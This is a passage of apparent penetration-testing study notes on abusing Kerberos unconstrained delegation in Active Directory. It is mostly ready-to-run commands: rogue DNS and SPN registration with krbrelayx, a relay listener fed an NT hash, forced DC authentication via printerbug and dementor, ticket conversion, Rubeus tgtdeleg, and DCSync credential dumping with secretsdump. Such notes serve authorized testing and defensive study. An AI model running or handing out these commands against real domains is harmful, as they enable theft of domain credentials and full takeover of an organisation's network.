- `S4U2self` normally returns a ticket bound to the machine account's own SPN. `/altservice` rewrites that ticket's service class to the one you need — `cifs` for SMB file access, `host` for scheduled tasks, and so on — as long as it names a service of the **same host** whose TGT you hold.

>[!note] See [[Kerberos#S4U2Self and S4U2Proxy]] for the full mechanism. You can also forge a [[Silver Ticket]] directly from the captured machine account's key.

#### Using the ticket from Linux

- `Rubeus` hands you the TGT as a Base64-encoded `.kirbi` (the Windows ticket format). To use it from a Linux attack host, decode it to a `.kirbi` file and convert that to a `.ccache` with Impacket's [`ticketConverter.py`](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py):

```bash
echo '<Base64 TGT>' | base64 -d > ticket.kirbi
```
```bash
ticketConverter.py ticket.kirbi ticket.ccache
```

- Point `KRB5CCNAME` at the `.ccache` and confirm it loads:

```bash
export KRB5CCNAME=ticket.ccache
```
```bash
klist
```

>[!example]-
> ```bash
> klist
> ```
> ```bash
> Ticket cache: FILE:ticket.ccache
> Default principal: SQL01$@INLANEFREIGHT.LOCAL
> 
> Valid starting       Expires              Service principal
> 10/24/2026 10:19:42  10/24/2026 20:19:42  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
> 	renew until 10/31/2026 10:19:42
> ```

- Then use any Kerberos-aware Impacket tool with `-k -no-pass`. 
- For example, with a captured `DC01$` ticket, you can perform [[DCSync]]:

```bash
secretsdump.py -k -no-pass dc01.example.com
```

>[!note] Kerberos on Linux requires the target **FQDN** (not an IP address), working **DNS resolution**, and **clock sync** with the DC. See [[Pass-the-Ticket#Pass-the-Ticket from Linux]] for the full workflow.

## Attacking a user or service account

- A user or service account can also carry `TRUSTED_FOR_DELEGATION`. 
- It's exploited differently, because the account isn't tied to a machine you can compromise; the forwarded TGTs aren't cached in LSASS where you can dump them. 
- Instead, you can make a victim authenticate to an SPN that resolves to a host you control, then decrypt the forwarded TGT it sends with that key.
- For the attack, you need the delegation account's **long-term key** (its NT hash), to decrypt the forwarded ST that arrives, and **`GenericWrite`** (or equivalent) over the account, to add an SPN to it.
- You also need the ability to register a DNS record (any authenticated domain user can, by default).
---
- For the attack, you can use Dirk-jan Mollema's [`krbrelayx`](https://github.com/dirkjanm/krbrelayx) toolkit:

1. Add a DNS record pointing at your attacker machine (`10.10.11.5`) using [`dnstool.py`](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py):

```bash
python dnstool.py -u 'example.com\jdoe' -p 'passwd123' -r roguecomputer.example.com -d 10.10.11.5 --action add dc01.example.com
```

2. Verify the record resolves:

```bash
nslookup roguecomputer.example.com dc01.example.com
```

3. Add a `CIFS/<hostname>` SPN to the controlled delegation account (`sqldev`) using [`addspn.py`](https://github.com/dirkjanm/krbrelayx/blob/master/addspn.py):

```bash
python addspn.py -u 'example.com\jdoe' -p 'passwd123' --target-type samname -t sqldev -s cifs/roguecomputer.example.com dc01.example.com
```

>[!note] `--target-type samname` tells the tool the target is an account name, not a hostname.

4. Start the [`krbrelayx.py`](https://github.com/dirkjanm/krbrelayx/blob/master/krbrelayx.py) listener, giving it the delegation account's NT hash so it can decrypt the forwarded tickets it catches (export mode saves captured tickets to disk):

```bash
sudo python krbrelayx.py -hashes :<sqldev_NT_hash>
```

5. Coerce a target (e.g. the DC) to authenticate to the fake host, using [`printerbug.py`](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) or [`dementor.py`](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc):

```bash
python3 printerbug.py example.com/jdoe:passwd123@dc01.example.com roguecomputer.example.com
```

```bash
python dementor.py -u jdoe -p passwd123 -d example.com roguecomputer.example.com dc01.example.com
```

6. `krbrelayx.py` decrypts the forwarded ST, extracts the TGT, and writes it to a `.ccache` file.

7. Point `KRB5CCNAME` at the saved ticket and use it ([[Pass-the-Ticket]]), such as for [[DCSync]] (using Impacket's `secretsdump.py`):

```bash
export KRB5CCNAME='DC01$@EXAMPLE.COM_krbtgt@EXAMPLE.COM.ccache'
```
```bash
secretsdump.py -k -no-pass dc01.example.com
```

## Extracting your own TGT (`tgtdeleg`)

- `Rubeus`'s [`tgtdeleg`](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/extraction/tgtdeleg) can be used to retrieve a usable, forwardable TGT of your current user account (no local `Administrator` needed). 
- It abuses the Kerberos GSS-API: it calls `InitializeSecurityContext` with the `ISC_REQ_DELEGATE` flag against a target SPN, then extracts the forwarded TGT (a `KRB-CRED`) from the `AP-REQ` it builds.

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

- Unlike `monitor`, `tgtdeleg` can get you only your own TGT. It's useful when you don't have admin on the host but want a TGT to reuse elsewhere ([[Pass-the-Ticket]]).
## References and further reading

- [`Ticket Flag Details — Microsoft Learn`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/de260077-1955-447c-a120-af834afe45c2)
- [`Use the UserAccountControl flags to manipulate user account properties — Microsoft Learn`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)
- [`MS-RPRN: Print System Remote Protocol — Microsoft Learn`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1)
- [`T1187 — Forced Authentication — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1187/)
- [`RFC 4120 — The Kerberos Network Authentication Service (V5)`](https://www.rfc-editor.org/info/rfc4120)
---
- [`Rubeus — GhostPack GitHub`](https://github.com/GhostPack/Rubeus)
- [`Rubeus documentation — SpecterOps`](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/overview)
- [`SpoolSample — leechristensen GitHub`](https://github.com/leechristensen/SpoolSample)
- [`krbrelayx — dirkjanm GitHub`](https://github.com/dirkjanm/krbrelayx)
- [`Get-DomainComputer — PowerSploit documentation`](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainComputer/)
- [`findDelegation.py — Fortra Impacket GitHub`](https://github.com/fortra/impacket/blob/master/examples/findDelegation.py)
- [`Unconstrained delegation — NetExec wiki`](https://www.netexec.wiki/ldap-protocol/unconstrained-delegation)
---
- [`"Relaying" Kerberos — Having fun with unconstrained delegation — dirkjanm.io`](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
- [`(KUD) Unconstrained — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained)
- [`(KCD) Constrained — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained)
- [`(RBCD) Resource-based constrained — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
- [`S4U2self abuse — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse)
